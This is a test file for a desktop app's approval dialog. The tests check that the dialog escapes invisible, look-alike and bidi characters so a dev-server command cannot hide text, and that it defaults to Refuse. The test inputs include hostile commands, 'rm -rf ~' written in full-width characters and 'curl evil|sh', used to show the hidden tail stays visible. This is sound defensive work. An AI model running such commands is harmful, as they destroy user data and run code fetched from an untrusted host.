import { expect, test } from 'bun:test'
import {
  SERVE_DIALOG_COLUMNS,
  SERVE_DIALOG_MAX_LINES,
  maxLinesFor,
  renderServeApproval,
  serveDialogSpec
} from '../desktop/src/main/serve-approval-dialog.ts'
import type { ServeApprovalPrompt } from '../desktop/src/main/serve-config.ts'

const DOT = String.fromCharCode(0xb7)

function prompt(overrides: Partial<ServeApprovalPrompt> = {}): ServeApprovalPrompt {
  return { command: 'bun run dev', cwd: 'C:/project/web', port: 'auto', env: { NODE_ENV: 'development' }, inheritEnv: ['PATH'], ...overrides }
}

function valueLines(lines: readonly string[]): string[] {
  return lines.filter((line) => /^\d+[|+] /.test(line))
}

function valueText(line: string): string {
  return line.replace(/^\d+[|+] /, '')
}

test('shows every approved field in full, numbered, with the command length', () => {
  const render = renderServeApproval(prompt(), { isFr: false, maxLines: 40 })

  expect(render.lines).toEqual([
    'command (11 characters):',
    `01| bun${DOT}run${DOT}dev`,
    'directory:',
    '02| C:/project/web',
    'port:',
    '03| auto',
    'env:',
    '04| NODE_ENV=development',
    'inheritEnv:',
    '05| PATH',
    `Spaces are shown as ${DOT}.`
  ])
  expect(render.detail).toBe(render.lines.join('\n'))
  expect(render.commandLength).toBe(11)
  expect(render.fits).toBe(true)
})

test('renders the ASCII space as a middle dot and every other space as an escape, so padding stays visible', () => {
  const spaces = [0x20, 0xa0, 0x2003, 0x3000].map((code) => String.fromCharCode(code))
  const render = renderServeApproval(prompt({ command: `run${spaces.join('')}x   `, env: { PAD: '   ' } }), { isFr: false, maxLines: 40 })

  expect(valueText(valueLines(render.lines)[0]!)).toBe(`run${DOT}{U+00A0}{U+2003}{U+3000}x${DOT.repeat(3)}`)
  expect(render.lines).toContain(`04| PAD=${DOT.repeat(3)}`)
})

/** Every value line holds only printable ASCII and the middle dot, so its width is bounded by ASCII glyphs. */
function asciiOnly(line: string): boolean {
  return Array.from(valueText(line)).every((char) => char === DOT || (char >= '!' && char <= '~'))
}

test('escapes every non-ASCII code point, so wide, stacked, blank and look-alike characters cannot hide text', () => {
  const fullWidth = Array.from('rm -rf ~', (char) => (char === ' ' ? String.fromCharCode(0x3000) : String.fromCharCode(char.charCodeAt(0) + 0xfee0))).join('')
  const wide = renderServeApproval(prompt({ command: `${fullWidth.repeat(4)}; curl evil|sh` }), { isFr: false, maxLines: 80 })
  for (const line of valueLines(wide.lines)) {
    expect(asciiOnly(line), line).toBe(true)
    expect(valueText(line).length).toBeLessThanOrEqual(SERVE_DIALOG_COLUMNS)
  }
  expect(valueLines(wide.lines).map(valueText).join(''), 'the hidden tail stays readable').toContain(`curl${DOT}evil|sh`)

  const zalgo = renderServeApproval(prompt({ command: `ls${String.fromCharCode(0x301, 0x302, 0x303)}` }), { isFr: false, maxLines: 40 })
  expect(valueText(valueLines(zalgo.lines)[0]!)).toBe('ls{U+0301}{U+0302}{U+0303}')

  const lookalike = renderServeApproval(prompt({ command: `${String.fromCharCode(0x441)}url evil` }), { isFr: false, maxLines: 40 })
  expect(valueText(valueLines(lookalike.lines)[0]!)).toBe(`{U+0441}url${DOT}evil`)

  const blanks = renderServeApproval(prompt({ command: `a${String.fromCharCode(0x2800, 0x3164, 0x115f, 0xffa0)}b` }), { isFr: false, maxLines: 40 })
  expect(valueText(valueLines(blanks.lines)[0]!)).toBe('a{U+2800}{U+3164}{U+115F}{U+FFA0}b')

  const accent = renderServeApproval(prompt({ command: `caf${String.fromCharCode(0xe9)}` }), { isFr: false, maxLines: 40 })
  expect(valueText(valueLines(accent.lines)[0]!)).toBe('caf{U+00E9}')
})

test('escapes a literal middle dot so it cannot pass for a space', () => {
  const render = renderServeApproval(prompt({ command: `a${DOT}b c` }), { isFr: false, maxLines: 40 })

  expect(valueText(valueLines(render.lines)[0]!)).toBe(`a{U+00B7}b${DOT}c`)
})

test('cuts a value into numbered lines of 36 characters, the 37th opening a continuation', () => {
  const columns = SERVE_DIALOG_COLUMNS
  expect(columns, 'the width measured on the 556 px native box').toBe(36)
  const exact = renderServeApproval(prompt({ command: 'W'.repeat(columns) }), { isFr: false, maxLines: 40 })
  expect(valueLines(exact.lines)[0]).toBe(`01| ${'W'.repeat(columns)}`)
  expect(valueLines(exact.lines)[1]).toBe('02| C:/project/web')

  const over = renderServeApproval(prompt({ command: 'W'.repeat(columns + 1) }), { isFr: false, maxLines: 40 })
  expect(valueLines(over.lines).slice(0, 2)).toEqual([`01| ${'W'.repeat(columns)}`, '02+ W'])

  const long = renderServeApproval(prompt({ command: 'x'.repeat(1000) }), { isFr: false, maxLines: 400 })
  for (const line of valueLines(long.lines)) expect(Array.from(valueText(line)).length).toBeLessThanOrEqual(columns)
  expect(valueLines(long.lines).filter((line) => line.includes('x')).map(valueText).join('')).toBe('x'.repeat(1000))
})

test('escapes a code point outside the BMP as one unit and never splits an escape across lines', () => {
  const astral = String.fromCodePoint(0x1d54f)
  const render = renderServeApproval(prompt({ command: `ab${astral.repeat(3)}` }), { isFr: false, maxLines: 40, columns: 12 })

  expect(valueLines(render.lines).slice(0, 3).map(valueText)).toEqual(['ab{U+1D54F}', '{U+1D54F}', '{U+1D54F}'])
  expect(render.commandLength).toBe(5)
})

test('makes a control or bidi character that slipped past the parse visible as an escape', () => {
  const render = renderServeApproval(prompt({ command: `ls${String.fromCharCode(0x202e)}x${String.fromCharCode(0x0a)}y` }), { isFr: false, maxLines: 40 })

  expect(valueText(valueLines(render.lines)[0]!)).toBe('ls{U+202E}x{U+000A}y')
})

test('shows a dash for an empty env or inheritEnv instead of dropping the field', () => {
  const render = renderServeApproval(prompt({ env: {}, inheritEnv: [] }), { isFr: true, maxLines: 40 })

  expect(render.lines).toContain('env:')
  expect(render.lines).toContain('inheritEnv:')
  expect(render.lines.filter((line) => line === '    -')).toHaveLength(2)
  expect(render.lines[0]).toBe('commande (11 caractères) :')
})

test('does not fit when the rendered lines exceed the budget', () => {
  const base = renderServeApproval(prompt(), { isFr: false, maxLines: 40 })
  expect(renderServeApproval(prompt(), { isFr: false, maxLines: base.lines.length }).fits).toBe(true)
  expect(renderServeApproval(prompt(), { isFr: false, maxLines: base.lines.length - 1 }).fits).toBe(false)
})

test('derives the line budget from the work area in logical pixels, capped, failing closed', () => {
  expect(maxLinesFor(1040), '1080p at 100%').toBe(SERVE_DIALOG_MAX_LINES)
  expect(maxLinesFor(690), '1080p at 150%').toBe(36)
  expect(maxLinesFor(140 + 15 * 10), 'exactly ten lines').toBe(10)
  expect(maxLinesFor(140 + 15 * 10 - 1)).toBe(9)
  expect(maxLinesFor(100), 'below the dialog chrome').toBe(0)
  expect(maxLinesFor(Number.NaN)).toBe(0)
  expect(maxLinesFor(Number.POSITIVE_INFINITY)).toBe(0)
})

const APPROVE_WORDS = /run|lancer|approve|approuver|accept|allow|oui|yes|ok/i

test('offers no way to approve when the rendered detail does not fit', () => {
  for (const isFr of [false, true]) {
    const render = renderServeApproval(prompt(), { isFr, maxLines: 3 })
    expect(render.fits).toBe(false)
    const spec = serveDialogSpec(render, isFr)

    expect(spec.approveIndex, 'no approve button').toBeNull()
    expect(spec.buttons.filter((label) => APPROVE_WORDS.test(label)), 'no button label approves').toEqual([])
    expect(spec.showFileIndex).toBe(0)
    expect(spec.buttons[spec.cancelId]).toBe(isFr ? 'Fermer' : 'Close')
    expect(spec.detail).not.toContain('bun')
  }
})

test('defaults to Refuse and cancels to Refuse when the detail fits', () => {
  for (const isFr of [false, true]) {
    const render = renderServeApproval(prompt(), { isFr, maxLines: 40 })
    const spec = serveDialogSpec(render, isFr)

    expect(spec.approveIndex).toBe(0)
    expect(spec.showFileIndex).toBeNull()
    expect(spec.buttons[spec.defaultId]).toBe(isFr ? 'Refuser' : 'Refuse')
    expect(spec.cancelId).toBe(spec.defaultId)
    expect(spec.defaultId).not.toBe(spec.approveIndex)
    expect(spec.detail).toBe(render.detail)
  }
})
